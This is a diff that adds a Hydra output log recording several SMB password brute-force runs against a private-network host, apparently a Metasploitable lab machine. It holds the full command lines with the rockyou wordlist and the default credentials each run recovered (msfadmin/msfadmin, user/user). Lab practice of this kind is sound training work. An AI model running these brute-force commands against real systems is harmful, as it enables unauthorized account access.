@@ -1,0 +1,9 @@
+# Hydra v9.6 run at 2025-10-04 01:31:03 on 192.168.100.10 smb (hydra -v -e sr -I -s 139,445 -l Desktop/smb_users.txt -p /usr/share/wordlists/rockyou.txt -o Desktop/hydra_smb_brute.txt smb://192.168.100.10)
+# Hydra v9.6 run at 2025-10-04 01:34:43 on 192.168.100.10 smb (hydra -v -e sr -I -s 139,445 -L Desktop/smb_users.txt -P /usr/share/wordlists/rockyou.txt -o Desktop/hydra_smb_brute.txt 192.168.100.10 smb)
+# Hydra v9.6 run at 2025-10-04 01:38:29 on 192.168.100.10 smb (hydra -v -e sr -I -s 139,445 -L Desktop/smb_users.txt -P /usr/share/wordlists/rockyou.txt -o Desktop/hydra_smb_brute.txt 192.168.100.10 smb)
+# Hydra v9.6 run at 2025-10-04 01:39:27 on 192.168.100.10 smb (hydra -v -e sr -I -s 139,445 -L Desktop/smb_users.txt -p admin -o Desktop/hydra_smb_brute.txt 192.168.100.10 smb)
+[139][smb] host: 192.168.100.10   login: msfadmin   password: msfadmin
+[139][smb] host: 192.168.100.10   login: user   password: user
+# Hydra v9.6 run at 2025-10-04 01:40:06 on 192.168.100.10 smb (hydra -v -e sr -I -s 139,445 -L Desktop/smb_users.txt -p password -o Desktop/hydra_smb_brute.txt 192.168.100.10 smb)
+[139][smb] host: 192.168.100.10   login: msfadmin   password: msfadmin
+[139][smb] host: 192.168.100.10   login: user   password: user
